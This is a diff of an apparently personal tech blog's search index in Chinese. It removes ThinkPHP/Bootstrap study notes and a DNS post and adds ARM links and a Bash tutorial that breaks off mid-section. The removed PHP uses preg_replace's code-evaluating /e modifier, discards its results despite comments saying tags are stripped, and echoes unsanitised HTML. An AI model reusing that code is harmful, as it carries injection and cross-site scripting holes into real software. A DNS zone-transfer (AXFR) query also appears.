@@ -34,61 +34,13 @@
       </categories>
   </entry>
   <entry>
-    <title>2018-寒假学习记录</title>
-    <url>/2018-%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="寒假学习记录">2018-寒假学习记录</h1>
-<h3 id="假期学习了">假期学习了</h3>
-<ul>
-<li>Thinkphp5.1</li>
-<li>Bootstrap4</li>
-<li>jquery ajax</li>
-<li>markdown</li>
-</ul>
-<h2 id="section"><a id="more"></a></h2>
-<h4 id="便于爬虫识别的html标签">便于爬虫识别的html标签</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">section定义 </span><br><span class="line">	用来区分各板块</span><br><span class="line">header main footer为方便爬虫检索</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table定义</span><br><span class="line"></span><br><span class="line">&lt;table border&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;Month&lt;&#x2F;th&gt;</span><br><span class="line">&lt;th&gt;Savings&lt;&#x2F;th&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;January&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;$100&lt;&#x2F;td&gt;</span><br><span class="line">&lt;&#x2F;tr&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">div 背景图片自适应显示</span><br><span class="line">	background-image: url(..&#x2F;imgs&#x2F;footerkuang.png);</span><br><span class="line">    background-repeat: no-repeat;     &#x2F;&#x2F;无重复</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    -moz-background-size: 100% 100%;</span><br><span class="line">	</span><br><span class="line">图片自适应div大小 </span><br><span class="line">	可重复</span><br><span class="line">	background-size:contain</span><br></pre></td></tr></table></figure>
-<h4 id="thinkphp5.1">ThinkPhp5.1</h4>
-<ol type="1">
-<li>在linux下,需要权限php程序才能运行php文件,所以需要<code>chown apache2.apache2 /var/html/tp5/runtime -R</code> 递归修改tp5下的runtime目录</li>
-<li>在linux下,使用文件上传,应该给tp5目录下的public/upload目录apapche用户权限,否则无法上传文件.</li>
-<li>在linux下,需要额外安装php7.2-mysql,否则会产生无法访问数据库的错误.</li>
-<li>linux配置php-fpm时,使用sock连接fpm时应该这么写</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        DocumentRoot &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;                        </span><br><span class="line">        ServerName www.divint3.com            </span><br><span class="line">        ServerAlias divint3.com               </span><br><span class="line">        DirectoryIndex index.htm index.php index.html</span><br><span class="line">  &lt;Directory &quot;&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&quot;&gt;</span><br><span class="line">        Options FollowSymLinks ExecCGI &#x2F;&#x2F;禁止访问目录,允许在该目录下执行CGI脚本</span><br><span class="line">        AllowOverride All &#x2F;&#x2F;允许rewrite,根据htc</span><br><span class="line">        Order allow,deny &#x2F;&#x2F;设置缺省的访问权限与Allow和Deny语句的处理顺序</span><br><span class="line">        Allow from all &#x2F;&#x2F;允许从任何地址访问</span><br><span class="line">        Require all granted &#x2F;&#x2F;允许所有请求访问资源</span><br><span class="line">        Satisfy all &#x2F;&#x2F;禁止直接访问</span><br><span class="line">  &lt;&#x2F;Directory&gt;</span><br><span class="line">        ProxyRequests Off</span><br><span class="line">        ProxyPassMatch ^&#x2F;(.*\.php(&#x2F;.*)?)$ unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock|fcgi:&#x2F;&#x2F;localhost&#x2F;home&#x2F;divint3&#x2F;WWW&#x2F;tp5&#x2F;public&#x2F;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-<p>最后用phpinfo()验证是否开启php-fpm成功</p>
-<ol start="5" type="1">
-<li>linux下apache开启模块 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a2enmod rewrite </span><br><span class="line">a2enmod proxy</span><br><span class="line">a2enmod proxy_fcgi</span><br></pre></td></tr></table></figure></li>
-<li>想要隐藏url的php文件名,应该编辑.<strong>htaccess</strong> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  &#x2F;&#x2F;以上为默认配置文件</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s&#x3D;$1 [QSA,PT,L]</span><br><span class="line">  &#x2F;&#x2F;写的是rewrite规则,可以省略index.php文件访问</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure></li>
-<li>本来要自己写分页操作的,没想到tp5自己有分页操作,语法 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bkList</span><span class="params">($type)</span></span>&#123;</span><br><span class="line">    $info=Bkarticle::where(<span class="string">"type"</span>,$type)-&gt;paginate(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 获取分页显示</span></span><br><span class="line">    $page = $info-&gt;render();</span><br><span class="line">    <span class="comment">// 模板变量赋值</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'info'</span>, $info);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">'page'</span>, $page);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> Bkartical为数据库中的同名表.可用于查询数据库中的同名表.<code>paginate(10)</code>的意思是每页显示十条数据. 这是tp5中的模型操作数据库. <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;extend name="./common/father" /&#125; //继承父模板</span><br><span class="line"></span><br><span class="line">&#123;block name="title"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>灾害大百科<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="content"&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"text-center table  table-bordered"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章标题<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章内容预览<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;volist name='info' id='bklist' length="50"&#125;</span><br><span class="line">            &#123;php&#125;</span><br><span class="line">                $content=$bklist["content"];</span><br><span class="line">                preg_replace('/<span class="tag">&lt;<span class="name">\s*img\s+[^</span>&gt;</span>]*?src\s*=\s*(\'|\")(.*?)\\1[^&gt;]*?\/?\s*&gt;/i','[图片]',$content); //把数据库中取出的html文本数据中的匹配img标签的文本替换为[img],因为这这只是一个预览内容,不能把整个img文件链接地址暴露出来</span><br><span class="line">                preg_replace('/(<span class="tag">&lt;/<span class="name">?)(w+)([^</span>&gt;</span>]*&gt;)/e', "'\1'.strtoupper('\2').'\3'", $content); //替换掉所有标签,只保留文本内容</span><br><span class="line">                $content=substr($content,0,100); //截取100的长度</span><br><span class="line">            &#123;/php&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/bkarticle/&#123;$bklist.id&#125;"</span>&gt;</span>&#123;$bklist.title&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"text-left"</span>&gt;</span>&#123;php&#125;echo $content;&#123;/php&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;/volist&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"float-right"</span>&gt;</span>&#123;$info|raw&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> //这里输出分页表</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="js"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/js/baike/bklist.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br></pre></td></tr></table></figure> 使用jquery为对象添加class,因为{$info|raw}输出的是一个html代码,而这个代码不法修改,只能用jquery确定元素,增加class <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(function () &#123;</span><br><span class="line">    $(&quot;main section div div ul li&quot;).addClass(&quot;page-item&quot;);</span><br><span class="line">    $(&quot;main section div div ul span&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">    $(&quot;main section div div ul li a&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure> 分页效果如下 <img src="/uploads/fzcms.png" alt="分页" /></li>
-<li>phpstrom在linux下有个东西不知道怎么取消,反正就是根据是否使用git提交文件的颜色会有变化,其实只要Alt+F12 用git同步就行了,一个add,一个comment颜色就没啦,这种颜色不一样保持了我这个强迫症不断备份啊.红色是未提交,绿色是新添加,蓝色是已修改</li>
-</ol>
-<p>9.PHP版本过高会使tp5无法连接数据库,在尝试数据库迁移时,会报错<code>SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client</code>发生这种错误，是由于MySQL 8默认使用了新的密码验证插件：caching_sha2_password，而之前的PHP版本中所带的mysqlnd无法支持这种验证。</p>
-<p>修改 /etc/mysql/my.cnf，添加下面一行： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">default_authentication_plugin&#x3D; mysql_native_password</span><br></pre></td></tr></table></figure> 然后重置密码： <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER USER &#39;user&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;password&#39;;</span><br></pre></td></tr></table></figure> ---</p>
-<h4 id="简单的ajax.post">简单的ajax.post</h4>
-<ol type="1">
-<li>首先说说a标签如何触发onclick事件</li>
-</ol>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:void(0);"</span> <span class="attr">onclick</span>=<span class="string">"js_method()"</span>&gt;</span>Some Thing<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里herf超链接指向了一个空的js脚本,然后定义onclick事件 这样,我们可以使用a标签使用onclick事件发送一个ajax请求 定义一个类 叫做upload,创建一个方法,用来接收数据,这里在js处理完数据后,php仍然会检验数据可用性,我把它定义在了<strong>admin/bkadd/addcheck</strong>下, <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 前端文章上传类</span></span><br><span class="line"><span class="comment">* @author Divint3</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> upload = &#123;</span><br><span class="line">    check: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> type = $(<span class="string">'input[name="type"]:checked'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> title = $(<span class="string">'input[name="title"]'</span>).val();</span><br><span class="line">        <span class="keyword">var</span> content = editor.txt.html();<span class="comment">//获取各种值并定义变量</span></span><br><span class="line">        <span class="keyword">if</span> (content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"内容不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!title) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"标题不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!type) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.error(<span class="string">"未指定文章类型"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">"admin/bkadd/addcheck"</span>;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="string">"type"</span>: type,</span><br><span class="line">            <span class="string">"title"</span>: title,</span><br><span class="line">            <span class="string">"content"</span>: content,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        $.post(url, data, <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;<span class="comment">//result是admin/bkadd/addcheck返回的json数据</span></span><br><span class="line">            <span class="keyword">if</span> (result.status) &#123;<span class="comment">//status返回的是php检验数据是否成功,检验数据成功后,tp5助手函数db会返回一个非零数值,如果插入失败,返回零</span></span><br><span class="line">                dialog.success(result.message);<span class="comment">//dialog封装了layer弹出层的方法,方便调用</span></span><br><span class="line">                editor.txt.html(<span class="string">'&lt;p&gt;&lt;br&gt;&lt;/p&gt;'</span>);</span><br><span class="line">                $(<span class="string">'input[name="title"]'</span>).val(<span class="string">""</span>);<span class="comment">//数据信息清空</span></span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                dialog.error(result.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"JSON"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<p>PHP检验代码如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//这里接收ajax请求,处理请求</span></span><br><span class="line">        $type = $_POST[<span class="string">'type'</span>];</span><br><span class="line">        $title = $_POST[<span class="string">'title'</span>];</span><br><span class="line">        $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!$type) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'未指定文章类型'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'标题不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($content == <span class="string">"&lt;p&gt;&lt;br&gt;&lt;/p&gt;"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">'内容不能为空'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [</span><br><span class="line">            <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">            <span class="string">"title"</span> =&gt; $title,</span><br><span class="line">            <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $isset = Bkarticle::where(<span class="string">"title"</span>, $title)-&gt;find();</span><br><span class="line">        <span class="keyword">if</span> ($isset == <span class="keyword">array</span>()) &#123;</span><br><span class="line">            $s = db(<span class="string">"bkarticle"</span>)-&gt;data($data)-&gt;insert();</span><br><span class="line">            <span class="keyword">return</span> show($s, <span class="string">"插入百科文章成功"</span>, <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">"type"</span> =&gt; $type,</span><br><span class="line">                <span class="string">"content"</span> =&gt; $content,</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> show(<span class="number">0</span>, <span class="string">"这个文章名已经被用过了"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>这里的show方法我定义在了application下的comment.php下,因为这里是公共方法,所有方法都可以引用 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($status, $message, $data = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result=[</span><br><span class="line">        <span class="string">'status'</span>=&gt;$status,</span><br><span class="line">        <span class="string">'message'</span>=&gt;$message,</span><br><span class="line">        <span class="string">'data'</span>=&gt;$data,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">exit</span>(json_encode($result));</span><br><span class="line">&#125;<span class="comment">//就是返回了一个json,给使用ajax.post方法的一个result,这样js才能处理插入状态</span></span><br></pre></td></tr></table></figure></p>
-<hr />
-<h4 id="bootstrap4">bootstrap4</h4>
-<ol type="1">
-<li>使用bs4的原因是他的排版和配色真的好看,给大家一个bs4主题链接https://bootswatch.com/ ,配色什么的方案多样.</li>
-<li>bs4的栅格结构也很好,支持动态响应.反正我现阶段是写不出来.</li>
-<li>bs4没啥好说的,就是个css加js,调用就完事了. 常用知识点 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">容器</span><br><span class="line">	container 类用于固定宽度并支持响应式布局的容器。</span><br><span class="line">	container-fluid 类用于 100% 宽度，占据全部视口（viewport）的容器</span><br><span class="line">颜色操作 bg-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">	</span><br><span class="line">前景色 text-</span><br><span class="line"></span><br><span class="line">字体位置</span><br><span class="line">	text-center&#x2F;left&#x2F;right</span><br><span class="line">	font-weight-normal 普通</span><br><span class="line">				-bold 加粗</span><br><span class="line">英文变换</span><br><span class="line">	text-lowercase 小写</span><br><span class="line">		-uppercase 大写</span><br><span class="line">		-capitalize 自动大小写</span><br><span class="line">字体大小 display-</span><br><span class="line">	display-1 最大</span><br><span class="line">			-2</span><br><span class="line">			-3</span><br><span class="line">			-4 最小</span><br><span class="line"></span><br><span class="line">网格系统 col-</span><br><span class="line">	一共划分为12个网格</span><br><span class="line">	.col- 针对极小屏幕</span><br><span class="line">	.col-sm- 平板 - 屏幕宽度等于或大于 576px</span><br><span class="line">	.col-md- 桌面显示器 - 屏幕宽度等于或大于 768px)</span><br><span class="line">	.col-lg- 大桌面显示器 - 屏幕宽度等于或大于 992px)</span><br><span class="line">	.col-xl- 超大桌面显示器 - 屏幕宽度等于或大于 1200px)</span><br><span class="line">	</span><br><span class="line">	xl与lg同时存在,若大于xl判定,使用xl规则,大于lg小于xl,使用lg规则,以此类推</span><br><span class="line">	只定义了col-md 那么md及md以上使用md的规则,md以下使用默认规则</span><br><span class="line">	</span><br><span class="line">	offset-</span><br><span class="line">		偏移系统,指定偏移多少单位,最高12</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">余白与边框 </span><br><span class="line">	padding 余白</span><br><span class="line">	margin 边框</span><br><span class="line">	写法</span><br><span class="line">		p&#x2F;m&#123;location&#x3D;t[op]b[lod]l[eft]r[ight]xy&#125;-size</span><br><span class="line">		x代表上下</span><br><span class="line">		y代表左右</span><br><span class="line">	size定义值</span><br><span class="line">		1 0.25rem</span><br><span class="line">		2 0.5rem</span><br><span class="line">		3 1rem</span><br><span class="line">		4 1.5rem</span><br><span class="line">		5 3rem</span><br><span class="line">	maigin在class中定义</span><br><span class="line">		margin-tblr:#px %</span><br><span class="line">	        &#123;margin-left: auto;</span><br><span class="line">            margin-right: auto;&#125;代表水平居中</span><br><span class="line">			</span><br><span class="line">按钮定义 btn-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">定义行 row</span><br><span class="line">显示顺序 order	</span><br><span class="line">	order-屏幕尺寸-顺序值</span><br></pre></td></tr></table></figure></li>
-</ol>
-<hr />
-<h4 id="layer弹出层">layer弹出层</h4>
-<p>这就是个充数的,调用看官网就行了.</p>
-<hr />
-<h4 id="markdown">MarkDown</h4>
-<p>同上</p>
+    <title>ARM-相关知识及传送门</title>
+    <url>/ARM-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%8F%8A%E4%BC%A0%E9%80%81%E9%97%A8/</url>
+    <content><![CDATA[<h3 id="portal">Portal</h3>
+<p><a href="https://azeria-labs.com/writing-arm-assembly-part-1/" target="_blank" rel="noopener">官方介绍</a> <a href="https://blog.csdn.net/MyArrow/article/details/9701499" target="_blank" rel="noopener">CPSR/SPSR</a> <a href="https://blog.csdn.net/caihaitao2000/article/details/84843270" target="_blank" rel="noopener">异常处理</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/81906495" target="_blank" rel="noopener">arm架构64位入门基础：架构分析、寄存器、调用规则、指令集、程序调试以及参考手册</a> <a href="https://blog.csdn.net/SoaringLee_fighting/article/details/82530435" target="_blank" rel="noopener">arm架构64位（AArch64）汇编优化总结</a></p>
 ]]></content>
       <categories>
-        <category>编程</category>
+        <category>ARM</category>
       </categories>
   </entry>
   <entry>
@@ -140,13 +92,325 @@
       </categories>
   </entry>
   <entry>
-    <title>Dns服务相关</title>
-    <url>/Dns%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
-    <content><![CDATA[<h4 id="dig命令">dig命令</h4>
-<p>显示域名详细信息,所有记录 以前的方式是全量区域传送,但是大部分域名服务器经过配置已经不允许区域传送,所以使用如下命令 <code>dig -t ANY +noall +multiline +answer 域名 @DNS服务器</code> 全量区域传送方式: <code>dig -t AXFR 域名 @DNS服务器</code> 反向解析 <code>dig -x ip地址 @DNS服务器</code></p>
+    <title>Linux-bash</title>
+    <url>/Linux-bash/</url>
+    <content><![CDATA[<h1 id="bash">Bash</h1>
+<h2 id="shell是一种弱类型的编程语言">shell是一种弱类型的编程语言</h2>
+<h3 id="配置文件">配置文件</h3>
+<p><strong>profile</strong>：定义环境变量，运行程序或者脚本，只在用户登录时才会运行该配置文件</p>
+<p><strong>bashrc</strong>：设置本地变量，定义命令别名</p>
+<a id="more"></a>
+<h4 id="登录式shell配置文件及次序">登录式shell，配置文件及次序</h4>
+<p><code>/etc/profile --&gt; /etc/profile.d/*.sh --&gt; ~/.bash_profile --&gt; ~/.bashrc --&gt; /etc/bashrc</code></p>
+<h4 id="非登录式shell配置文件及次序">非登录式shell，配置文件及次序</h4>
+<p><code>~/.bashrc --&gt; /etc/bashrc --&gt; /etc/profile.d/*.sh</code></p>
+<hr />
+<h2 id="linux变量">linux变量</h2>
+<p><strong>变量赋值</strong>：变量名=变量值</p>
+<p><strong>撤销变量</strong>：unset 变量名</p>
+<p><strong>引用变量</strong>：$变量名</p>
+<h3 id="bash变量类型">bash变量类型</h3>
+<ol type="1">
+<li><strong>环境变量</strong>：作用域为当前shell进程及其子进程
+<ol type="1">
+<li>查看环境变量
+<ol type="1">
+<li>printenv</li>
+<li>env</li>
+<li>export</li>
+</ol></li>
+</ol></li>
+<li><strong>本地变量</strong>：作用域为整个bash进程
+<ol type="1">
+<li>查看本地变量
+<ol type="1">
+<li>set</li>
+</ol></li>
+</ol></li>
+<li><strong>特殊变量</strong>
+<ol type="1">
+<li><code>$?</code>
+<ol type="1">
+<li>返回上一个命令执行状态返回值，值为0代表程序正确执行，非零都为错误执行</li>
+</ol></li>
+<li><code>$#</code>
+<ol type="1">
+<li>返回传入参数个数</li>
+</ol></li>
+<li><code>$@</code>
+<ol type="1">
+<li>返回参数内容，多个参数返回列表</li>
+</ol></li>
+<li><code>$*</code>
+<ol type="1">
+<li>返回所有参数</li>
+</ol></li>
+<li><code>$RANDOM</code>
+<ol type="1">
+<li>生成随机数</li>
+</ol></li>
+<li><code>$$</code>
+<ol type="1">
+<li>返回当前进程id</li>
+</ol></li>
+<li><code>$!</code>
+<ol type="1">
+<li>后台运行的最后一个进程的id号</li>
+</ol></li>
+</ol></li>
+<li><strong>位置变量</strong>
+<ol type="1">
+<li><code>$0</code>
+<ol type="1">
+<li>脚本名，带上所有引用路径</li>
+</ol></li>
+<li><code>$1-9</code>
+<ol type="1">
+<li>参数</li>
+</ol></li>
+<li>注意，<code>$10</code> 不能获取第十个参数，获取第十个参数需要​<code>${10}</code>。当n&gt;=10时，需要使用<code>${n}</code>来获取参数</li>
+</ol></li>
+</ol>
+<p>shift命令，踢出参数</p>
+<hr />
+<h3 id="数组">数组</h3>
+<ol type="1">
+<li>声明数组
+<ol type="1">
+<li><code>declare -a 数组名</code></li>
+</ol></li>
+<li>数组赋值
+<ol type="1">
+<li>数组名={元素1 元素2 ……}
+<ol type="1">
+<li>human={jack tom divint3}</li>
+</ol></li>
+<li>数组名={[元素位置1]=元素值1 [元素位置]2=元素2 ……}
+<ol type="1">
+<li>human={[0]=jack [1]=tom [6]=Divint3}</li>
+</ol></li>
+</ol></li>
+</ol>
+<h2 id="管道与重定向">管道与重定向</h2>
+<h3 id="输入输出重定向">输入输出重定向</h3>
+<ol type="1">
+<li>标准输入：代码为 0 ；或称为 stdin ；使用的方式为 &lt;</li>
+<li>标准输出：代码为 1 ；或称为 stdout；使用的方式为 1&gt;</li>
+<li>错误输出：代码为 2 ；或称为 stderr；使用的方式为 2&gt;</li>
+</ol>
+<p>输入重定向,一般输入到一个程序中:<code>&lt;</code> 输出通定向:<code>&gt;</code> 追加输出重定向:<code>&gt;&gt;</code> 在此处生成文档 Here Document:<code>&lt;&lt;</code></p>
+<p>例如: 不指定输出位置,则输出到屏幕:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Divint3:~<span class="comment"># cat &lt;&lt; EOF</span></span><br><span class="line">&gt; The First Line.</span><br><span class="line">&gt; The Second Line.</span><br><span class="line">&gt; EOF</span><br><span class="line">The First Line.</span><br><span class="line">The Second Line.</span><br></pre></td></tr></table></figure>
+<p>指定输出位置,则输出到指定位置: <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Divint3:~<span class="comment"># cat &lt;&lt; EOF &gt;&gt; doc.txt</span></span><br><span class="line">&gt; The First Line.</span><br><span class="line">&gt; The Second Line.</span><br><span class="line">&gt; EOF</span><br><span class="line">root@Divint3:~<span class="comment"># cat doc.txt </span></span><br><span class="line">The First Line.</span><br><span class="line">The Second Line.</span><br></pre></td></tr></table></figure></p>
+<p>bash中使用&gt;&lt;|时 -用作占位符</p>
+<p><code>set -C</code>:阻止覆盖重定向 强制覆盖输出 <code>&gt;|</code> <code>set +C</code>:取消阻止覆盖重定向重定向</p>
+<p>tee: 既能保证输出可以输出到标准输出(屏幕),也能保证输出到文件中.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Divint3:~# echo &quot;echo&quot; | tee &#x2F;tmp&#x2F;a</span><br><span class="line">echo</span><br><span class="line">root@Divint3:~# cat &#x2F;tmp&#x2F;a</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
+<h4 id="重定向所有输出标准输出以及标准错误输出">重定向所有输出(标准输出以及标准错误输出)</h4>
+<p><code>ls &gt; /dev/null 2&gt;&amp;1</code></p>
+<hr />
+<h2 id="bash编程">bash编程</h2>
+<h3 id="流程控制">流程控制</h3>
+<h4 id="分支结构">分支结构</h4>
+<h5 id="多行if结构">多行if结构</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<h5 id="单行if结构">单行if结构</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ $(ps -ef | grep -c <span class="string">"ssh"</span>) -gt 1 ]; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">"true"</span>; <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<h5 id="if-else">if else</h5>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    command1 </span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<h5 id="if-elif-else">if elif else</h5>
